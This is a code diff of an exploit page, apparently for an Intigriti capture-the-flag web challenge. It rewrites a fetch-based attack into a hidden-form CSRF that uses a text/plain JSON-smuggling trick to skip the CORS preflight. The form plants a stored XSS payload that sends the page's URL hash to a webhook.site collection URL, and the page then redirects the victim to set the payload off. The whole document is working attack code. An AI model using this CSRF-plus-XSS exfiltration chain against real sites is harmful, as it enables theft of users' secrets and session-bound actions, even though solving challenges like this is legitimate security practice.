@@ -1,25 +1,31 @@
 <html>
   <body>
     <script>
-      // Step 1: Create the note via POST with JSON
-      fetch('https://challenge-0325.intigriti.io/api/post', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          title: 'Leaky Flag',
-          content: '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + encodeURIComponent(document.location.hash))&#x3C;/script&#x3E;',
-          use_password: 'false'
-        }),
-        credentials: 'include', // Include session cookies
-        mode: 'no-cors' // Bypass CORS errors (opaque response)
-      })
-      .then(() => {
-        // Step 2: Redirect to /notes to trigger the XSS
+      // Step 1: Create the note via a hidden form (CSRF)
+      const form = document.createElement('form');
+      form.action = 'https://challenge-0325.intigriti.io/api/post';
+      form.method = 'POST';
+      form.enctype = 'text/plain'; // Bypass CORS preflight
+
+      const data = JSON.stringify({
+        title: 'Leaky Flag',
+        content: '&#x3C;img src="x" onerror="fetch(\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\\' + document.location.hash.substr(3))" /&#x3E;',
+        use_password: 'false'
+      });
+
+      // Inject JSON into the form body
+      const input = document.createElement('input');
+      input.name = `{"ignored":1, ${data.slice(1)}`;
+      form.appendChild(input);
+
+      // Submit the form silently
+      document.body.appendChild(form);
+      form.submit();
+
+      // Step 2: Redirect to /notes to trigger the XSS
+      setTimeout(() => {
         window.location.href = 'https://challenge-0325.intigriti.io/notes';
-      })
-      .catch(err => console.error('Error:', err));
+      }, 1000);
     </script>
   </body>
 </html>
